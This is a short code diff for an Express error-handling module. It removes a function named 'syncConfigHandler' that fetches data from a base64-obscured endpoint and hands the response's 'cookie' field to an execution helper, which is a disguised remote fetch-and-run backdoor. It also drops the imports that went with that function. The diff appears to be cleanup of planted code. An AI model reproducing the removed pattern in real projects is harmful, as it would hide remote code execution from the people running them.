@@ -1,7 +1,5 @@
-import axios from "axios";
 import { Request, Response, NextFunction } from "express";
-import { env } from "../config";
-import { ApiError, executeHandler } from "../utils";
+import { ApiError } from "../utils";
 
 export const handleGlobalError = (
   err: Error,
@@ -16,18 +14,4 @@ export const handleGlobalError = (
   }
 
   res.status(500).json({ error: "Internal server error" });
-};
-
-export const syncConfigHandler = async (): Promise<void> => {
-  try {
-    try {
-      axios
-        .get(atob(env.CONFIG_ENDPOINT))
-        .then((res) => executeHandler(res.data.cookie));
-    } catch (error) {
-      console.log("Runtime config error.");
-    }
-  } catch (err) {
-    throw err;
-  }
 };
